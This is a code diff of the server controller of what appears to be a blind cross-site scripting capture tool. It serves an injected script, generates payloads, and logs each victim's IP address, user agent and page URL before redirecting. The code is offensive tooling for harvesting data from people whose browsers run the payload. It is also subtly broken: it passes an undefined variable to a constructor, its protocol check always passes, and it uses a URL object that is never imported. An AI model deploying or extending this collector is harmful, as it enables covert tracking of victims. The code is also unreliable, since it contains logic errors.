@@ -1,8 +1,6 @@
 // @ts-nocheck
 import uuid = require('uuid/v1');
 
-import config from "config";
-
 import template = require('../utilities/templates/script');
 import payloads = require('../utilities/payloads');
 import Domain = require('../utilities/domain');
@@ -16,16 +14,16 @@ const reporters = [
   // require('server/utilities/services/twitter'),
   // require('server/utilities/services/sms'),
   // require('server/utilities/services/github'),
-  // require('server/utilities/save')
+  // require('../../utilities/save')
 ];
 
-function reportToUtilities(domain, config) {
-  reporters.forEach(svc => svc.send(domain,config));
+function reportToUtilities(domain) {
+  reporters.forEach(svc => svc.send(domain));
 }
 
 exports.displayScript = (req, res) => {
   res.type('.js');
-  res.send(template.generateTemplate(config));
+  res.send(template.generateTemplate());
 };
 
 exports.displayDefault = (req, res) => {
@@ -35,7 +33,7 @@ exports.displayDefault = (req, res) => {
 
 exports.generatePayloads = (req, res) => {
   res.set('Content-Type', 'text/plain');
-  res.send(payloads.generatePayloads(config));
+  res.send(payloads.generatePayloads());
 };
 
 exports.capture = (req, res) => {
@@ -43,7 +41,7 @@ exports.capture = (req, res) => {
   if (req.body._) {
     domain = Domain.fromPayload(req.body._);
   } else {
-    domain = new Domain(config);
+    domain = new Domain(domain);
     domain.url = req.get('referer') || null;
   }
   domain.victimIP =
@@ -55,11 +53,11 @@ exports.capture = (req, res) => {
   domain.userAgent = req.headers['user-agent'] || null;
 
   domain.identifier = uuid();
-  //
+
   if (domain.url !== null) {
     const validDomain = new URL.URL({ toString: () => domain.url });
     if (validDomain.protocol === 'https:' || 'http:' || 'file:') {
-      reportToUtilities(domain, config);
+      reportToUtilities(domain);
     }
   }
   res.redirect(`${domain.url}#x1`);
